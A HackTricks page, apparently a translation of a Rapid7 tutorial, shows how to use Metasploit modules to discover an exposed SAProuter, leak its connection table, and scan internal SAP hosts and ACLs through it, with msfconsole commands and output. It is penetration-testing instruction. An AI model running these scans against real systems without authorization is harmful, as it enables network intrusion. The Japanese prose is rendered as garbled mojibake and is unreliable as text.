<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„å ´åˆ**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„å ´åˆ**ã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>


ã‚³ãƒ”ãƒ¼å…ƒ: [https://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/](https://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/)
```text
PORT     STATE SERVICE    VERSION
3299/tcp open  saprouter?
```
# Metasploitã‚’ä½¿ç”¨ã—ãŸSAProuterã®è²«é€š

SAProuterã¯åŸºæœ¬çš„ã«SAPã‚·ã‚¹ãƒ†ãƒ ã®ãŸã‚ã®ãƒªãƒãƒ¼ã‚¹ãƒ—ãƒ­ã‚­ã‚·ã§ã€é€šå¸¸ã¯ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã¨å†…éƒ¨ã®SAPã‚·ã‚¹ãƒ†ãƒ ã®é–“ã«ä½ç½®ã—ã¦ã„ã¾ã™ã€‚ãã®ä¸»ãªç›®çš„ã¯ã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆä¸Šã®ãƒ›ã‚¹ãƒˆã‹ã‚‰å†…éƒ¨ã®SAPã‚·ã‚¹ãƒ†ãƒ ã¸ã®åˆ¶å¾¡ã•ã‚ŒãŸã‚¢ã‚¯ã‚»ã‚¹ã‚’å¯èƒ½ã«ã™ã‚‹ã“ã¨ã§ã€ã“ã‚Œã«ã‚ˆã‚Šã€ä¸€èˆ¬çš„ãªãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã‚ˆã‚Šã‚‚SAPãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ã‚ˆã‚Šç´°ã‹ãåˆ¶å¾¡ã§ãã¾ã™ã€‚

ã“ã‚Œã¯ã€saprouterãŒé€šå¸¸ã€çµ„ç¹”ã®ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ä¸Šã§ã‚¤ãƒ³ãƒã‚¦ãƒ³ãƒ‰TCPãƒãƒ¼ãƒˆ3299ã‚’saprouterãƒ›ã‚¹ãƒˆã«è¨±å¯ã™ã‚‹ã“ã¨ã«ã‚ˆã‚Šã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã«éœ²å‡ºã™ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚ãã—ã¦ã€saprouterã‹ã‚‰ã¯ã€å°‘ãªãã¨ã‚‚å†…éƒ¨ã®SAPã‚µãƒ¼ãƒãƒ¼ã«åˆ°é”å¯èƒ½ã§ã‚ã‚‹ã¹ãã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€éå¸¸ã«èˆˆå‘³æ·±ã„ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã¨ãªã‚Šã¾ã™ã€‚ãªãœãªã‚‰ã€ã“ã‚Œã¯ã€Œé«˜ä¾¡å€¤ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã¸ã®å…¥ã‚Šå£ã‚’æä¾›ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã‹ã‚‰ã§ã™ã€‚

ä»¥ä¸‹ã®å›³ã¯ã€ä¾‹ã§ä½¿ç”¨ã™ã‚‹åŸºæœ¬çš„ãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯è¨­å®šã‚’ç¤ºã—ã¦ã„ã¾ã™ï¼š

![](https://blog.rapid7.com/content/images/post-images/33923/image1.jpg)

ã¾ãšã€éœ²å‡ºã—ã¦ã„ã‚‹IPã‚¢ãƒ‰ãƒ¬ã‚¹ã€ã“ã®å ´åˆã¯1.2.3.101ã®SAPã‚µãƒ¼ãƒ“ã‚¹ã‚¹ã‚­ãƒ£ãƒ³ã‚’[`sap_service_discovery`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_service_discovery)ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦å®Ÿè¡Œã—ã¾ã™ã€‚
```text
msf> use auxiliary/scanner/sap/sap_service_discovery
msf auxiliary(sap_service_discovery) > set RHOSTS 1.2.3.101
RHOSTS => 1.2.3.101
msf auxiliary(sap_service_discovery) > run

[*] [SAP] Beginning service Discovery '1.2.3.101'

[+] 1.2.3.101:3299      - SAP Router OPEN
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
ã‚¹ã‚­ãƒ£ãƒ³ã®çµæœã€ãƒ›ã‚¹ãƒˆãŒäºˆæƒ³ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆTCP 3299ã§SAPãƒ«ãƒ¼ã‚¿ãƒ¼ã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚ã“ã‚Œã§ã•ã‚‰ã«æ·±ãæ˜ã‚Šä¸‹ã’ã€saprouterã‹ã‚‰æƒ…å ±ã‚’å–å¾—ã—ã‚ˆã†ã¨è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚èª¤è¨­å®šã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒå¤šãã€ãã®å ´åˆã€saprouterã‚’ä»‹ã—ã¦å†…éƒ¨ãƒ›ã‚¹ãƒˆã«ç¢ºç«‹ã•ã‚ŒãŸæ¥ç¶šãªã©ã®å†…éƒ¨æƒ…å ±ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã«ãªã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã“ã®ç›®çš„ã®ãŸã‚ã«ã€[`sap_router_info_request`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_info_request)ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¾ã™ï¼š
```text
msf auxiliary(sap_router_info_request) > use auxiliary/scanner/sap/sap_router_info_request
msf auxiliary(sap_router_info_request) > set RHOSTS 1.2.3.101
RHOSTS => 1.2.3.101
msf auxiliary(sap_router_info_request) > run

[+] 1.2.3.101:3299 - Connected to saprouter
[+] 1.2.3.101:3299 - Sending ROUTER_ADM packet info request
[+] 1.2.3.101:3299 - Got INFO response
[+] Working directory   : /opt/sap
[+] Routtab             : ./saprouttab

[SAP] SAProuter Connection Table for 1.2.3.101
===================================================

Source        Destination   Service
------        -----------   -------
1.2.3.12      192.168.1.18  3200


[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
```
å‡ºåŠ›ã‹ã‚‰ã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆä¸Šã®èª°ã‹ï¼ˆ1.2.3.12ï¼‰ãŒå†…éƒ¨ãƒ›ã‚¹ãƒˆï¼ˆ192.168.1.18ï¼‰ã«ãƒãƒ¼ãƒˆ3200ã§æ¥ç¶šã—ã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚ãƒãƒ¼ãƒˆ3200ã¯ã€SAP GUIã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒSAPã‚µãƒ¼ãƒãƒ¼ã«æ¥ç¶šã™ã‚‹ãŸã‚ã®DIAGãƒ—ãƒ­ãƒˆã‚³ãƒ«ç”¨ã®ä¸€èˆ¬çš„ãªSAPãƒãƒ¼ãƒˆã§ã™ã€‚ã¾ãŸã€å†…éƒ¨IPã‚¢ãƒ‰ãƒ¬ãƒƒã‚·ãƒ³ã‚°ã‚¹ã‚­ãƒ¼ãƒ ã«é–¢ã™ã‚‹æƒ…å ±ã‚‚å¾—ã‚‰ã‚Œã¾ã™ã€‚å½¼ã‚‰ã¯å°‘ãªãã¨ã‚‚192.168.1.0/24ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã€ã¾ãŸã¯ãã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã®ã„ãã¤ã‹ã®ã‚µãƒ–ãƒãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã“ã¨ãŒã‹ãªã‚Šç¢ºå®Ÿã§ã™ã€‚

**å†…éƒ¨ãƒ›ã‚¹ãƒˆã¨ã‚µãƒ¼ãƒ“ã‚¹ã®åˆ—æŒ™**

ã“ã®æƒ…å ±ã‚’ã‚‚ã¨ã«ã€å†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã®ã‚¹ã‚­ãƒ£ãƒ³ã‚’é–‹å§‹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚saprouterã¯ãƒ—ãƒ­ã‚­ã‚·ã®ã‚ˆã†ã«æ©Ÿèƒ½ã™ã‚‹ãŸã‚ã€saprouterã«æ¥ç¶šã—ã¦å†…éƒ¨ãƒ›ã‚¹ãƒˆã¨ãƒãƒ¼ãƒˆã¸ã®æ¥ç¶šã‚’è¦æ±‚ã—ã€saprouterã‹ã‚‰ã®è¿”ä¿¡ã‚’ç¢ºèªã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€saprouterã®è¨­å®šã«å¿œã˜ã¦ã€å†…éƒ¨ãƒ›ã‚¹ãƒˆã€ã‚µãƒ¼ãƒ“ã‚¹ã€ãŠã‚ˆã³ACLã«é–¢ã™ã‚‹ã‚ˆã‚Šè©³ç´°ãªæ´å¯Ÿã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã“ã®ç›®çš„ã®ãŸã‚ã«[`sap_router_portscanner`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_portscanner)ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

ã“ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¯saprouterã«æ¥ç¶šã—ã€ä»–ã®ãƒ›ã‚¹ãƒˆï¼ˆTARGETSã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§å®šç¾©ã•ã‚Œã¦ã„ã‚‹ï¼‰ã¸ã®ç‰¹å®šã®TCPãƒãƒ¼ãƒˆã§ã®æ¥ç¶šã‚’è¦æ±‚ã—ã¾ã™ã€‚æ¬¡ã«ã€è¿”ä¿¡ã‚’åˆ†æã—ã€è¦æ±‚ã•ã‚ŒãŸæ¥ç¶šãŒå¯èƒ½ã‹ã©ã†ã‹ã‚’åˆ¤æ–­ã—ã¾ã™ã€‚ã“ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã«ã¯ä½¿ç”¨ã§ãã‚‹ã„ãã¤ã‹ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãŒã‚ã‚Šã¾ã™ï¼š
```
```text
Basic options:
Name         Current Setting  Required  Description
----         ---------------  --------  -----------
CONCURRENCY  10               yes       The number of concurrent ports to check per host
INSTANCES    00-99            no        SAP instance numbers to scan (NN in PORTS definition)
MODE         SAP_PROTO        yes       Connection Mode: SAP_PROTO or TCP  (accepted: SAP_PROTO, TCP)
PORTS        32NN             yes       Ports to scan (e.g. 3200-3299,5NN13)
RESOLVE      local            yes       Where to resolve TARGETS (accepted: remote, local)
RHOST                         yes       SAPRouter address
RPORT        3299             yes       SAPRouter TCP port
TARGETS                       yes       Comma delimited targets. When resolution is local address ranges or CIDR identifiers allowed.
```
æœ€ä½é™ã€saprouterã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¨­å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ã®å ´åˆã¯ã€1.2.3.101ã§ã™ã€‚æ¬¡ã«ã€ã‚¹ã‚­ãƒ£ãƒ³ã—ãŸã„å†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’TARGETSã«è¨­å®šã—ã€æœ€å¾Œã«ã‚¹ã‚­ãƒ£ãƒ³ã™ã‚‹TCPãƒãƒ¼ãƒˆã‚’PORTSã«è¨­å®šã—ã¾ã™ã€‚

ã“ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã«ã¯ã€PORTSã‚ªãƒ—ã‚·ãƒ§ãƒ³ã®å®šç¾©ã‚’ç°¡ç•¥åŒ–ã™ã‚‹ãŸã‚ã®INSTANCESã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚‚æä¾›ã•ã‚Œã¦ã„ã¾ã™ã€‚SAPã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã¯è¤‡æ•°ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ãŠã‚Šã€é¡ä¼¼ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’æä¾›ã—ã¦ã„ã‚‹ãŸã‚ã€å„ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ã¯TCPãƒãƒ¼ãƒˆãŒå‰²ã‚Šå½“ã¦ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚ä¾‹ãˆã°ã€SAPã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹00ã¯SAPãƒ‡ã‚£ã‚¹ãƒ‘ãƒƒãƒãƒ£ãƒ¼ã‚µãƒ¼ãƒ“ã‚¹ï¼ˆSAP GUIãŒæ¥ç¶šã™ã‚‹ï¼‰ãŒãƒãƒ¼ãƒˆ3200ã«ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹01ã¯ãƒãƒ¼ãƒˆ3201ã«ã‚ã‚Šã¾ã™ã€‚PORTSã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯ã€ŒNNã€ã¨ã„ã†ã€Œãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ã€ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ãŠã‚Šã€ã“ã‚Œã¯ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ç•ªå·ã«ç½®ãæ›ãˆã‚‰ã‚Œã‚‹ãŸã‚ã€å®šç¾©ã•ã‚ŒãŸã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ãƒãƒ¼ãƒˆã‚’ã™ã¹ã¦ã‚¹ã‚­ãƒ£ãƒ³ã—ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€00ã‹ã‚‰50ã¾ã§ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—ãŸã„å ´åˆã€INSTANCESã¨PORTSå¤‰æ•°ã‚’æ¬¡ã®ã‚ˆã†ã«å®šç¾©ã§ãã¾ã™ï¼š
```text
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-50
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > set PORTS 32NN
PORTS => 32NN
```
ã“ã®è¨­å®šã§ã¯ã€ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¯3200ã‹ã‚‰3250ã®ç¯„å›²ã®ãƒãƒ¼ãƒˆã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—ã¾ã™ã€‚

ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®ã‚½ãƒ¼ã‚¹ã«ã¯ã€ã‚¹ã‚­ãƒ£ãƒ³ã«ä½¿ç”¨ã™ã‚‹SAPã‚·ã‚¹ãƒ†ãƒ ã®ä¸€èˆ¬çš„ãªãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒ¼ãƒˆã«é–¢ã™ã‚‹æƒ…å ±ãŒã‚ã‚Šã¾ã™ã€‚
```text
msf > use auxiliary/scanner/sap/sap_router_portscanner
msf auxiliary(sap_router_portscanner) > use auxiliary/scanner/sap/sap_router_portscanner
msf auxiliary(sap_router_portscanner) > set RHOST 1.2.3.101
RHOST => 1.2.3.101
msf auxiliary(sap_router_portscanner) > set TARGETS 192.168.1.18
TARGETS => 192.168.1.18
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-01
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > set PORTS 32NN,33NN,48NN,80NN,36NN,81NN,5NN00-5NN19,21212,21213,59975,59976,4238-4241,3299,3298,515,7200,7210,7269,7270,7575,39NN,3909,4NN00,8200,8210,8220,8230,4363,4444,4445,9999,3NN01-3NN08,3NN11,3NN17,20003-20007,31596,31597,31602,31601,31604,2000-2002,8355,8357,8351-8353,8366,1090,1095,20201,1099,1089,443NN,444NN
PORTS => 32NN,33NN,48NN,80NN,36NN,81NN,5NN00-5NN19,21212,21213,59975,59976,4238-4241,3299,3298,515,7200,7210,7269,7270,7575,39NN,3909,4NN00,8200,8210,8220,8230,4363,4444,4445,9999,3NN01-3NN08,3NN11,3NN17,20003-20007,31596,31597,31602,31601,31604,2000-2002,8355,8357,8351-8353,8366,1090,1095,20201,1099,1089,443NN,444NN
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host           Port   State   Info
----           ----   -----   ----
192.168.1.18   3201   closed  SAP Dispatcher sapdp01
192.168.1.18   3200   open    SAP Dispatcher sapdp00
192.168.1.18   50013  open    SAP StartService [SOAP] sapctrl00

[*] Auxiliary module execution completed
```
saprouterã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ä¸€éƒ¨ã®æ¥ç¶šãŒè¨±å¯ã•ã‚Œãªã„ç†ç”±ã‚’ç†è§£ã™ã‚‹ãŸã‚ã«ã€VERBOSEã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚VERBOSEãŒtrueã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€saprouterã‹ã‚‰ã®å¿œç­”ã‚’è¦‹ã‚‹ã“ã¨ãŒã§ãã€å®šç¾©ã•ã‚ŒãŸACLã‚’ãƒãƒƒãƒ”ãƒ³ã‚°ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

æ¬¡ã«ã€192.168.1.18ã¨192.168.1.1ã®ãƒ›ã‚¹ãƒˆã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—ã¾ã™ãŒã€ãƒãƒ¼ãƒˆ3200ã®ã¿ã§ã€ä¸¡æ–¹ã®SAPãƒ‡ã‚£ã‚¹ãƒ‘ãƒƒãƒãƒ£ãƒ¼ã«æ¥ç¶šã§ãã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™ï¼š
```text
msf auxiliary(sap_router_portscanner) > set VERBOSE true
VERBOSE => true
msf auxiliary(sap_router_portscanner) > set TARGETS 192.168.1.1,192.168.1.18
TARGETS => 192.168.1.1,192.168.1.18
msf auxiliary(sap_router_portscanner) > set PORTS 32NN
PORTS => 32NN
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[+] 192.168.1.18:3200 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host          Port  State   Info
----          ----  -----   ----
192.168.1.18  3200  open  SAP Dispatcher sapdp00

[*] Scanning 192.168.1.1
[-] 192.168.1.1:3200 - blocked by ACL
[!] Warning: Service info could be inaccurate
[*] Auxiliary module execution completed
```
ACLã®ãƒãƒƒãƒ”ãƒ³ã‚°

saprouterã«ã¤ã„ã¦èˆˆå‘³æ·±ã„ç‚¹ã¯ã€2ç¨®é¡ã®æ¥ç¶šã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã‚‹ã“ã¨ã§ã™ï¼š

* ãƒã‚¤ãƒ†ã‚£ãƒ– â€“ ã“ã‚Œã‚‰ã¯å˜ç´”ãªTCPæ¥ç¶šã§ã™ï¼›
* SAPãƒ—ãƒ­ãƒˆã‚³ãƒ« â€“ ã“ã‚Œã‚‰ã¯ã²ã­ã‚Šã‚’åŠ ãˆãŸTCPæ¥ç¶šã§ã€ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¯ã™ã¹ã¦ã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒç¶šãå†…å®¹ã®é•·ã•ã‚’ç¤ºã™4ãƒã‚¤ãƒˆã§å§‹ã¾ã‚‹ã¨è¦å®šã—ã¦ã„ã¾ã™ã€‚

SAPãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¯saprouterã«ç‰¹æœ‰ã®ã‚‚ã®ã§ã€SAP GUIãŒsaprouterã‚’é€šã˜ã¦SAP DIAGãƒãƒ¼ãƒˆã«æ¥ç¶šã™ã‚‹éš›ã«ä½¿ç”¨ã—ã¾ã™ã€‚ãƒã‚¤ãƒ†ã‚£ãƒ–ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¯ã€ä»–ã®ç¨®é¡ã®æ¥ç¶šãŒsaprouterã‚’é€šéã™ã‚‹ã“ã¨ã‚’è¨±å¯ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ã“ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã§ã¯ã€ã‚¹ã‚­ãƒ£ãƒ³ä¸­ã«ãƒ†ã‚¹ãƒˆã™ã‚‹æ¥ç¶šã®ç¨®é¡ã‚’MODEã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§æŒ‡å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã¯SAPãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§ã€æœ¬ç•ªç’°å¢ƒã§ä½¿ç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒæœ€ã‚‚é«˜ã„ã§ã™ã€‚ã—ã‹ã—ã€saprouterã‚’é€šã˜ã¦ä»–ã®ã‚µãƒ¼ãƒ“ã‚¹ãŒè¨±å¯ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚‚çã—ããªãã€ACLã¯ãƒã‚¤ãƒ†ã‚£ãƒ–ï¼ˆTCPï¼‰æ¥ç¶šã‚’é€šéã•ã›ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

æ¥ç¶šã®ã“ã®ã‚¿ã‚¤ãƒ—ãŒè¨±å¯ã•ã‚Œã¦ã„ã‚‹ã‹ã‚’è©•ä¾¡ã™ã‚‹ãŸã‚ã«ã€MODEã‚’TCPã«è¨­å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚VERBOSEã‚’trueã«è¨­å®šã—ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹00ã¨01ã®ä¸¡æ–¹ã§ã€å†…éƒ¨ãƒ›ã‚¹ãƒˆã‚’ãƒãƒ¼ãƒˆ3200ï¼ˆSAP DIAGï¼‰ã¨80ï¼ˆHTTPï¼‰ã§ã‚¹ã‚­ãƒ£ãƒ³ã—ã€ä½•ãŒèµ·ã“ã‚‹ã‹è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ï¼š
```text
msf auxiliary(sap_router_portscanner) > set MODE TCP
MODE => TCP

msf auxiliary(sap_router_portscanner) > set PORTS 80,32NN
PORTS => 80,32NN
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-01
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[+] 192.168.1.18:80 - TCP OPEN
[-] 192.168.1.18:3200 - blocked by ACL
[+] 192.168.1.18:3201 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host          Port  State  Info
----          ----  -----  ----
192.168.1.18  80    open
192.168.1.18  3201  open   SAP Dispatcher sapdp01

[*] Scanning 192.168.1.1
[-] 192.168.1.1:3200 - blocked by ACL
[+] 192.168.1.1:3201 - TCP OPEN
[+] 192.168.1.1:80 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host         Port  State  Info
----         ----  -----  ----
192.168.1.1  3201  open   SAP Dispatcher sapdp01
192.168.1.1  80    open

[*] Auxiliary module execution completed
```
```
å‡ºåŠ›ã¨å…ˆã®æƒ…å ±ã‹ã‚‰ã€ACLã¯ä»¥ä¸‹ã®ã‚ˆã†ãªã‚‚ã®ã§ã‚ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ï¼š

* ä»»æ„ã®ãƒ›ã‚¹ãƒˆã‹ã‚‰192.168.1.1ã¸ã®TCPæ¥ç¶šã‚’ãƒãƒ¼ãƒˆ80ã§è¨±å¯
* ä»»æ„ã®ãƒ›ã‚¹ãƒˆã‹ã‚‰192.168.1.18ã¸ã®TCPæ¥ç¶šã‚’ãƒãƒ¼ãƒˆ80ã§è¨±å¯
* ä»»æ„ã®ãƒ›ã‚¹ãƒˆã‹ã‚‰192.168.1.1ã¸ã®TCPæ¥ç¶šã‚’ãƒãƒ¼ãƒˆ3201ã§è¨±å¯
* ä»»æ„ã®ãƒ›ã‚¹ãƒˆã‹ã‚‰192.168.1.18ã¸ã®TCPæ¥ç¶šã‚’ãƒãƒ¼ãƒˆ3201ã§è¨±å¯
* ä»»æ„ã®ãƒ›ã‚¹ãƒˆã‹ã‚‰192.168.1.18ã¸ã®SAPæ¥ç¶šã‚’ãƒãƒ¼ãƒˆ3200ã§è¨±å¯

**å†…éƒ¨ãƒ›ã‚¹ãƒˆã®ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰åˆ—æŒ™**

æ€ã„å‡ºã—ã¦ãã ã•ã„ã€ç§ãŸã¡ã¯saprouterã‹ã‚‰æƒ…å ±ã‚’å–å¾—ã™ã‚‹ã“ã¨ã‹ã‚‰å§‹ã‚ã€å†…éƒ¨ãƒ›ã‚¹ãƒˆã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’çŸ¥ã‚Šã€ãã“ã‹ã‚‰é€²ã‚ã¾ã—ãŸã€‚ã—ã‹ã—ã€saprouterãŒãã®æƒ…å ±ã‚’æä¾›ã—ãªã„å ´åˆã¯ã©ã†ã§ã—ã‚‡ã†ã‹ï¼Ÿ

ä¸€ã¤ã®é¸æŠè‚¢ã¯ã€ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆã‚¢ãƒ‰ãƒ¬ã‚¹ç©ºé–“ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—å§‹ã‚ã¦ã€ä½•ãŒèµ·ã“ã‚‹ã‹ã‚’è¦‹ã‚‹ã“ã¨ã§ã™ã€‚ã‚‚ã†ä¸€ã¤ã¯ã€ãƒ›ã‚¹ãƒˆåã«ã‚ˆã£ã¦ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰ã«ãƒ›ã‚¹ãƒˆã‚’åˆ—æŒ™ã™ã‚‹ã“ã¨ã§ã™ã€‚

